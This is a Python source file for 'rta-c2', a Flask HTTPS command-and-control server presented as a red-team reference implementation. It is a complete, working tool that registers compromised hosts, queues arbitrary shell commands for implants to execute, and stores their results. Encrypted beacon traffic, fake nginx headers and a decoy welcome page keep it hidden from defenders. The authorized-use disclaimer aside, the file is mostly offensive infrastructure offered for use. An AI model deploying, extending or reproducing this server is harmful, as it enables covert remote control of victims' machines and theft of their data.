#!/usr/bin/env python3
"""
rta-c2 — Custom HTTPS C2 server for authorized red team engagements.

Educational reference implementation. For use only in authorized
penetration tests, red team engagements, and CTF competitions.

Architecture:
  - Flask HTTPS listener bound to localhost; redirector proxies to it.
  - Implants beacon to /api/v1/ping with an encrypted body.
  - Tasking is pulled by implants and pushed by operators via the CLI.
  - All traffic is AES-256-GCM encrypted with a pre-shared implant key
    derived from the per-implant ID + the campaign master key.
  - SQLite for implant registry, tasking, and results.
  - JSON-over-syslog for operator audit trail.
"""

import argparse
import base64
import hashlib
import json
import logging
import logging.handlers
import os
import secrets
import sqlite3
import ssl
import sys
import time
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, request, jsonify, abort

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

DB_PATH = Path(os.environ.get("RTA_C2_DB", "/var/lib/rta-c2/c2.db"))
MASTER_KEY_PATH = Path(os.environ.get("RTA_C2_KEY", "/var/lib/rta-c2/master.key"))
BIND_HOST = os.environ.get("RTA_C2_HOST", "127.0.0.1")
BIND_PORT = int(os.environ.get("RTA_C2_PORT", "8443"))
TLS_CERT = os.environ.get("RTA_C2_CERT", "/var/lib/rta-c2/cert.pem")
TLS_KEY = os.environ.get("RTA_C2_TLS_KEY", "/var/lib/rta-c2/key.pem")
SYSLOG_HOST = os.environ.get("RTA_C2_SYSLOG", "10.8.0.50")
SYSLOG_PORT = int(os.environ.get("RTA_C2_SYSLOG_PORT", "514"))

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

logger = logging.getLogger("rta-c2")
logger.setLevel(logging.INFO)
stream = logging.StreamHandler(sys.stdout)
stream.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
logger.addHandler(stream)

try:
    syslog = logging.handlers.SysLogHandler(address=(SYSLOG_HOST, SYSLOG_PORT))
    syslog.setFormatter(logging.Formatter("rta-c2 %(message)s"))
    logger.addHandler(syslog)
except Exception as exc:  # pragma: no cover - syslog may be unreachable in dev
    logger.warning(f"syslog unreachable ({exc}); continuing without remote log")

# ---------------------------------------------------------------------------
# Crypto
# ---------------------------------------------------------------------------


def load_master_key() -> bytes:
    """Load or generate the campaign master key (32 bytes)."""
    if MASTER_KEY_PATH.exists():
        return MASTER_KEY_PATH.read_bytes()
    MASTER_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)
    key = secrets.token_bytes(32)
    MASTER_KEY_PATH.write_bytes(key)
    MASTER_KEY_PATH.chmod(0o600)
    logger.info("generated new master key")
    return key


def implant_key(master: bytes, implant_id: str) -> bytes:
    """Per-implant key = HKDF-style blake2b(master || implant_id)."""
    return hashlib.blake2b(
        master + implant_id.encode(),
        digest_size=32,
        person=b"rta-c2-v1",
    ).digest()


def encrypt(key: bytes, plaintext: bytes) -> str:
    nonce = secrets.token_bytes(12)
    ct = AESGCM(key).encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ct).decode()


def decrypt(key: bytes, payload: str) -> bytes:
    raw = base64.b64decode(payload)
    nonce, ct = raw[:12], raw[12:]
    return AESGCM(key).decrypt(nonce, ct, None)


# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------

SCHEMA = """
CREATE TABLE IF NOT EXISTS implants (
    id           TEXT PRIMARY KEY,
    hostname     TEXT,
    username     TEXT,
    os           TEXT,
    arch         TEXT,
    ip           TEXT,
    first_seen   INTEGER,
    last_seen    INTEGER,
    notes        TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS tasks (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    implant_id   TEXT NOT NULL,
    command      TEXT NOT NULL,
    created_at   INTEGER NOT NULL,
    sent_at      INTEGER,
    result       TEXT,
    completed_at INTEGER,
    operator     TEXT
);
CREATE INDEX IF NOT EXISTS idx_tasks_implant ON tasks(implant_id);
CREATE INDEX IF NOT EXISTS idx_tasks_pending ON tasks(implant_id, sent_at);
"""


def db() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(DB_PATH, isolation_level=None)
    conn.row_factory = sqlite3.Row
    conn.executescript(SCHEMA)
    return conn


def register_implant(meta: dict) -> None:
    now = int(time.time())
    with db() as conn:
        existing = conn.execute(
            "SELECT id FROM implants WHERE id = ?", (meta["id"],)
        ).fetchone()
        if existing:
            conn.execute(
                "UPDATE implants SET last_seen = ?, ip = ? WHERE id = ?",
                (now, meta.get("ip", ""), meta["id"]),
            )
            return
        conn.execute(
            """INSERT INTO implants(id, hostname, username, os, arch, ip,
                                    first_seen, last_seen)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                meta["id"],
                meta.get("hostname", ""),
                meta.get("username", ""),
                meta.get("os", ""),
                meta.get("arch", ""),
                meta.get("ip", ""),
                now,
                now,
            ),
        )
        logger.info(f"new implant registered id={meta['id']} host={meta.get('hostname')}")


def pop_task(implant_id: str) -> Optional[dict]:
    now = int(time.time())
    with db() as conn:
        row = conn.execute(
            """SELECT id, command FROM tasks
               WHERE implant_id = ? AND sent_at IS NULL
               ORDER BY id ASC LIMIT 1""",
            (implant_id,),
        ).fetchone()
        if not row:
            return None
        conn.execute("UPDATE tasks SET sent_at = ? WHERE id = ?", (now, row["id"]))
        return {"id": row["id"], "command": row["command"]}


def record_result(task_id: int, result: str) -> None:
    now = int(time.time())
    with db() as conn:
        conn.execute(
            "UPDATE tasks SET result = ?, completed_at = ? WHERE id = ?",
            (result, now, task_id),
        )


# ---------------------------------------------------------------------------
# HTTP surface
# ---------------------------------------------------------------------------

app = Flask(__name__)
MASTER = load_master_key()


@app.after_request
def camouflage(response):
    """Make responses look like a generic CDN origin."""
    response.headers["Server"] = "nginx"
    response.headers["Cache-Control"] = "no-store"
    response.headers.pop("X-Powered-By", None)
    return response


@app.route("/", methods=["GET"])
def decoy_root():
    # Decoy page for anyone poking the hostname directly.
    return (
        "<!doctype html><title>It works</title><h1>It works!</h1>"
        "<p>This is the default welcome page.</p>",
        200,
    )


@app.route("/api/v1/ping", methods=["POST"])
def ping():
    """Implant check-in. Body: {id, nonce}. Encrypted with implant key."""
    body = request.get_json(silent=True) or {}
    iid = body.get("id")
    blob = body.get("data")
    if not iid or not blob:
        abort(404)
    try:
        plain = decrypt(implant_key(MASTER, iid), blob)
        meta = json.loads(plain)
    except Exception:
        abort(404)

    meta["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    register_implant(meta)

    task = pop_task(iid)
    if task is None:
        response_obj = {"t": "noop"}
    else:
        response_obj = {"t": "exec", "tid": task["id"], "cmd": task["command"]}
        logger.info(f"tasked implant={iid} tid={task['id']} cmd={task['command']}")

    enc = encrypt(
        implant_key(MASTER, iid),
        json.dumps(response_obj).encode(),
    )
    return jsonify({"data": enc})


@app.route("/api/v1/result", methods=["POST"])
def result():
    """Implant returns task output."""
    body = request.get_json(silent=True) or {}
    iid = body.get("id")
    blob = body.get("data")
    if not iid or not blob:
        abort(404)
    try:
        plain = decrypt(implant_key(MASTER, iid), blob)
        payload = json.loads(plain)
    except Exception:
        abort(404)
    record_result(int(payload["tid"]), payload.get("out", ""))
    logger.info(f"result implant={iid} tid={payload['tid']}")
    return jsonify({"ok": True})


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(description="rta-c2 HTTPS C2 server")
    parser.add_argument("--host", default=BIND_HOST)
    parser.add_argument("--port", type=int, default=BIND_PORT)
    parser.add_argument("--cert", default=TLS_CERT)
    parser.add_argument("--key", default=TLS_KEY)
    args = parser.parse_args()

    if not os.path.exists(args.cert) or not os.path.exists(args.key):
        logger.error(f"missing TLS material: {args.cert} / {args.key}")
        sys.exit(1)

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(args.cert, args.key)

    logger.info(f"rta-c2 listening on https://{args.host}:{args.port}")
    logger.info(f"database {DB_PATH}")
    logger.info(f"master key {MASTER_KEY_PATH}")
    app.run(host=args.host, port=args.port, ssl_context=ctx, threaded=True)


if __name__ == "__main__":
    main()
